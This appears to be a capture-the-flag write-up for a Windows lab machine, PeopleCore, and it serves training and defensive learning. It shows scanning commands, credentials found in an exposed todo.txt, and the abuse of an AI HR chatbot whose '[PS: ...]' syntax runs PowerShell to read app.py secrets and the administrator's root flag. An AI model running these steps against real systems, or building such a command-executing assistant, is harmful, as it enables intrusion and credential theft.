# PeopleCore — Hack The Box WriteUp

**Author:** Denis Sanchez Leyva — Vertex Coders LLC  
**Difficulty:** Medium  
**OS:** Windows  
**Date:** March 2026

---

## 📋 Tabla de Contenidos

1. [Machine Overview](#machine-overview)
2. [Reconnaissance](#reconnaissance)
3. [Initial Access — Credential Disclosure](#initial-access--credential-disclosure)
4. [User Flag — SSH Access](#user-flag--ssh-access)
5. [Privilege Escalation — Source Code Review](#privilege-escalation--source-code-review)
6. [Root Flag — Command Injection](#root-flag--command-injection)
7. [Attack Chain Summary](#attack-chain-summary)
8. [Mitigation Recommendations](#mitigation-recommendations)

---

## 🖥️ Machine Overview

PeopleCore is a Windows Server 2022 machine running an AI-powered HR assistant web application. The machine exposes several services:

| Port | Service | Description |
|------|---------|-------------|
| 22/tcp | SSH | OpenSSH for Windows |
| 80/tcp | HTTP | IIS (default page) |
| 8080/tcp | HTTP | PeopleCore Web Portal (Flask) |
| 445/tcp | SMB | Windows file sharing |
| 5985/tcp | WinRM | Windows Remote Management |

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p22,80,445,8080,5985 10.10.10.100 -oN services.txt
```

**Results:**
```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp   open  http          Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds  Microsoft Windows 2022 microsoft-ds
8080/tcp open  http          waitress (Flask)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**[SCREENSHOT 1: Nmap scan results]**

---

### Web Enumeration

Visiting `http://10.10.10.100:8080` redirects to `/login`, showing a login page.

**[SCREENSHOT 2: Login page]**

---

### Directory Fuzzing

```bash
gobuster dir -u http://10.10.10.100:8080 -w /usr/share/wordlists/dirb/common.txt
```

**Results:**
```
/static (Status: 200)
/templates (Status: 200)
/login (Status: 200)
```

**[SCREENSHOT 3: Gobuster results]**

---

## 🔑 Initial Access — Credential Disclosure

### Finding Credentials

Navigating to `/static/todo.txt` reveals:

```
IT Tasks - Nexus Dynamics
========================
- Update HR portal credentials: jsmith / Welcome1!
- Migrate internal docs to HR-Docs share
- Test SSH access for HR team (jsmith)
- Configure WinRM for automation
```

**[SCREENSHOT 4: todo.txt content]**

**Credentials obtained:**
```
Username: jsmith
Password: Welcome1!
```

---

## 👤 User Flag — SSH Access

### SSH Login

```bash
ssh jsmith@10.10.10.100
Password: Welcome1!
```

**[SCREENSHOT 5: SSH login successful]**

### User Flag

```powershell
type C:\Users\hruser\Desktop\user.txt
```

**Output:**
```
HTB{user_placeholder_md5}
```

**[SCREENSHOT 6: User flag obtained]**

---

## 🔐 Privilege Escalation — Source Code Review

### Web Portal Access

Login to the web portal at `http://10.10.10.100:8080` with `jsmith:Welcome1!`.

**[SCREENSHOT 7: Web portal dashboard]**

The portal features an AI-powered HR Assistant that can execute PowerShell commands using the `[PS: command]` format.

### Reading Application Source Code

In the chat, send:

```
[PS: Get-Content C:\app\app.py]
```

**[SCREENSHOT 8: Command injection]**

**Output reveals hardcoded credentials:**

```python
USERS = {
    "jsmith": "Welcome1!",
    "mrodriguez": "HR2024!",
    "admin": "NexusAdmin123!"
}
app.secret_key = "NexusDyn@2024!core"
```

**[SCREENSHOT 9: app.py content with credentials]**

---

## 👑 Root Flag — Command Injection

### Reading Root Flag

With the same chat interface, send:

```
[PS: Get-Content C:\Users\Administrator\Desktop\root.txt]
```

**Output:**
```
HTB{root_placeholder_md5}
```

**[SCREENSHOT 10: Root flag obtained]**

---

## 📊 Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. RECONNAISSANCE                                               │
│    nmap → ports 22,80,445,8080,5985                            │
│    gobuster → /static/todo.txt                                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. INITIAL ACCESS — Credential Disclosure                      │
│    curl /static/todo.txt → jsmith:Welcome1!                    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. USER FLAG — SSH Access                                      │
│    ssh jsmith@target → type user.txt → HTB{user_hash}          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. PRIVILEGE ESCALATION — Source Code Review                    │
│    Login to web portal → [PS: Get-Content app.py]              │
│    → admin:NexusAdmin123!                                       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. ROOT FLAG — Command Injection                                │
│    [PS: Get-Content root.txt] → HTB{root_hash}                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛡️ Mitigation Recommendations

| Vulnerability | Location | Recommendation |
|---------------|----------|----------------|
| Hardcoded credentials | `/static/todo.txt` | Remove sensitive files from web root; use secure credential management |
| Hardcoded credentials in source | `app.py` | Store credentials in environment variables or secure vault |
| Command injection | `ps_bridge.py` | Validate and sanitize user inputs; avoid direct command execution |
| Exposed source code | Web chat reading `app.py` | Restrict file system access; implement proper path validation |

---

## 📁 Files and Hashes

### Flags
| Flag | Location | Hash |
|------|----------|------|
| User | `C:\Users\hruser\Desktop\user.txt` | `HTB{user_placeholder_md5}` |
| Root | `C:\Users\Administrator\Desktop\root.txt` | `HTB{root_placeholder_md5}` |

### Credentials
| User | Password | Access |
|------|----------|--------|
| jsmith | Welcome1! | SSH, Web Portal |
| admin | NexusAdmin123! | Web Portal (from source) |

---

## 🐳 Building the Machine

### Prerequisites
- Windows Server 2022 with Docker Engine
- Python 3.11+

### Steps
```powershell
# Clone repository
git clone https://github.com/Denisijcu/peoplecore.git
cd peoplecore

# Generate PDF (optional)
python generate_pdf.py

# Build Docker image
docker build -t peoplecore .

# Run container
docker run -d -p 8080:8080 -p 22:22 -p 445:445 -p 5985:5985 --name peoplecore peoplecore
```

---

## 📝 Notes for HTB Review Team

- **Machine ID:** PeopleCore — HTB AI Security Series #8
- **OS:** Windows Server 2022
- **Difficulty:** Medium
- **Total time to root:** ~45-60 minutes
- **Attack vectors:** Credential disclosure, SSH access, source code review, command injection
- **Privilege escalation:** From `jsmith` to admin via credentials in `app.py`, then command injection for root flag

---

## 🔑 Screenshot Checklist

| # | Section | Screenshot Description |
|---|---------|------------------------|
| 1 | Reconnaissance | Nmap scan results showing open ports |
| 2 | Reconnaissance | Login page at `http://IP:8080` |
| 3 | Reconnaissance | Gobuster results showing `/static` and `/templates` |
| 4 | Initial Access | `todo.txt` content with credentials |
| 5 | User Flag | SSH login as `jsmith` |
| 6 | User Flag | `type user.txt` output |
| 7 | Privilege Escalation | Web portal dashboard after login |
| 8 | Privilege Escalation | Chat with `[PS: Get-Content app.py]` |
| 9 | Privilege Escalation | `app.py` source code with admin credentials |
| 10 | Root Flag | Chat with `[PS: Get-Content root.txt]` showing root flag |

---

**Machine Author:** Denis Sanchez Leyva — Vertex Coders LLC  
**HTB AI Security Series — Machine #8**

